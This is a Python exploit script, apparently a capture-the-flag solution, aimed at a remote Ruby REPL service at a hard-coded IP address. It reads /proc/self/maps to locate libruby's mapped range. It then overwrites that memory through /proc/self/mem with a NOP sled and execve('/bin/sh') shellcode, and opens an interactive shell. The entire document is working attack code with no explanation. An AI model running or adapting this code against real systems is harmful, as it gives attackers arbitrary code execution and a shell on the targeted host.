from pwnlib import *

s = Socket(("52.192.198.197", 50216))

s.ru("baby> ")
s.send("ARGV << \"/proc/self/maps\"\n")

s.ru("\"]\x0d\nbaby> ")
s.send("print while gets\n")

s.ru("print while gets\r\n")

maps = s.ru("il\x0d\nbaby> ")
#begin = int(maps.split("-")[0], 16)
#end = int(maps.split("-")[1].split(" r")[0], 16)

target = "libruby"
line = [line for line in maps.split("\n") if target in line][0]
begin = int(line.split("-")[0], 16)
end = int(line.split("-")[1].split(" ")[0], 16)


command = 'IO.binwrite("/proc/self/mem", shellcode, %d)' % begin


times = end - begin - 100

code = "31c05048b92f2f62696e2f736851545f5057545e99b03b0f05".decode("hex")
code = "\\x" + "\\x".join(c.encode("hex") for c in code)


s.send("shellcode = \"\\x90\"*%d + \"%s\"; 1\n" % (times, code))

s.ru("\x0d\nbaby> ")
s.send(command + "\n")




s.interact()
